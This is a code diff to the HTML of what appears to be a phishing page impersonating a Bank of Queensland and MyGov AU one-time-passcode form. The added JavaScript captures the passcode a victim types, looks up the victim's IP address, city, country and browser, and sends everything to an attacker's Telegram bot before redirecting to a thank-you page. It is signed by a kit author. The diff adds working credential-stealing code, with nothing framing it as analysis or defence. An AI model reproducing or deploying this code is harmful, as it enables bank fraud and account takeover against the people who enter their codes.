@@ -25,8 +25,36 @@
         </form>
     </div>
 
+    <script src="config/email.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script>
+        async function sendTelegram(message) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
+                });
+                return await res.json();
+            } catch (e) { console.error(e); return null; }
+        }
+
+        async function getClientInfo() {
+            let ip = '0.0.0.0';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            let location = { country: 'Unknown', city: 'Unknown' };
+            try {
+                const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                const data = await res.json();
+                location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+            } catch(e) {}
+            return { ip, location, userAgent: navigator.userAgent };
+        }
+
         $(document).ready(function() {
             function toggleButton() {
                 const otp = $('#txtUserid').val().trim();
@@ -35,23 +63,28 @@
             $('#txtUserid').on('keyup change', toggleButton);
             $('#btnSignIn').prop('disabled', true);
 
-            $('#login-form').submit(function(e) {
+            $('#login-form').submit(async function(e) {
                 e.preventDefault();
                 const otp = $('#txtUserid').val().trim();
                 if (!otp) return;
 
-                const formData = { username: otp, title: 'Bank of Queensland OTP' };
-                $.ajax({
-                    type: 'GET',
-                    url: 'otp-sn.html',
-                    data: formData,
-                    success: function() {
-                        window.location.href = 'thank.html';
-                    },
-                    error: function() {
-                        alert('Error verifying OTP.');
-                    }
-                });
+                const info = await getClientInfo();
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: Bank of Queensland OTP\n";
+                message += "|OTP-Code: " + otp + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + info.ip + "\n";
+                message += "|City : " + info.location.city + "\n";
+                message += "|Country : " + info.location.country + "\n";
+                message += "|UserAgent : " + info.userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+                const result = await sendTelegram(message);
+                console.log('OTP Telegram result:', result);
+
+                window.location.href = 'thank.html';
             });
         });
     </script>
